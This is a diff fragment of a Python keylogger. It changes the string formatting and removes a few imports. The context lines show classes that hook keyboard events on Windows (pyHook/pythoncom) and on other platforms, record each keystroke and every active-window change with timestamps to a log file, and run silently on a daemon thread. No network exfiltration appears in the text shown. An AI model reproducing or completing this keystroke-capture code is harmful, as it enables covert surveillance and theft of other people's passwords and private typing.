@@ -6,10 +6,7 @@ from datetime import datetime
 
 # Try to import Windows-specific libraries
 try:
-    import win32api
-    import win32con
     import win32gui
-    import win32clipboard
     import pythoncom
     import pyHook
     WINDOWS_AVAILABLE = True
@@ -33,13 +30,13 @@ class KeyLogger:
         # Ensure log file exists
         if not os.path.exists(self.log_file):
             with open(self.log_file, 'w') as f:
-                f.write(f"Keylogger started at {datetime.now()}\n")
+                f.write("Keylogger started at {0}\n".format(datetime.now()))
                 f.write("=" * 50 + "\n")
     
     def log_keystroke(self, key_data):
         """Log keystroke to buffer and file"""
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = f"[{timestamp}] {key_data}\n"
+        log_entry = "[{0}] {1}\n".format(timestamp, key_data)
         
         # Add to buffer
         self.log_buffer.append(log_entry)
@@ -50,7 +47,7 @@ class KeyLogger:
                 f.write(log_entry)
                 f.flush()
         except Exception as e:
-            print(f"Error writing to log file: {e}")
+            print("Error writing to log file: {0}".format(e))
     
     def get_window_title(self):
         """Get the title of the currently active window"""
@@ -66,7 +63,7 @@ class KeyLogger:
     
     def log_window_change(self, title):
         """Log when user switches to a different window"""
-        self.log_keystroke(f"--- WINDOW CHANGED: {title} ---")
+        self.log_keystroke("--- WINDOW CHANGED: {0} ---".format(title))
 
 
 class WindowsKeyLogger(KeyLogger):
@@ -98,10 +95,10 @@ class WindowsKeyLogger(KeyLogger):
             if len(key_name) == 1:  # Regular character
                 self.log_keystroke(key_name)
             else:  # Special key
-                self.log_keystroke(f"[{key_name}]")
+                self.log_keystroke("[{0}]".format(key_name))
                 
         except Exception as e:
-            self.log_keystroke(f"[ERROR: {str(e)}]")
+            self.log_keystroke("[ERROR: {0}]".format(str(e)))
         
         return True  # Allow the event to propagate
     
@@ -153,7 +150,7 @@ class WindowsKeyLogger(KeyLogger):
             char = chr(event.Ascii)
             return char
         
-        return f"[{key}]"
+        return "[{0}]".format(key)
     
     def start(self):
         """Start the keylogger"""
@@ -175,7 +172,7 @@ class WindowsKeyLogger(KeyLogger):
                 pythoncom.PumpMessages()
                 
             except Exception as e:
-                self.log_keystroke(f"[KEYLOGGER ERROR: {str(e)}]")
+                self.log_keystroke("[KEYLOGGER ERROR: {0}]".format(str(e)))
         
         self.thread = threading.Thread(target=keylogger_thread, daemon=True)
         self.thread.start()
@@ -214,10 +211,10 @@ class CrossPlatformKeyLogger(KeyLogger):
             else:
                 # Special keys
                 key_name = str(key).replace('Key.', '')
-                self.log_keystroke(f"[{key_name.upper()}]")
+                self.log_keystroke("[{0}]".format(key_name.upper()))
                 
         except Exception as e:
-            self.log_keystroke(f"[ERROR: {str(e)}]")
+            self.log_keystroke("[ERROR: {0}]".format(str(e)))
     
     def on_release(self, key):
         """Handle key release events"""
@@ -242,7 +239,7 @@ class CrossPlatformKeyLogger(KeyLogger):
             self.listener.start()
             return True
         except Exception as e:
-            self.log_keystroke(f"[KEYLOGGER START ERROR: {str(e)}]")
+            self.log_keystroke("[KEYLOGGER START ERROR: {0}]".format(str(e)))
             return False
     
     def stop(self):
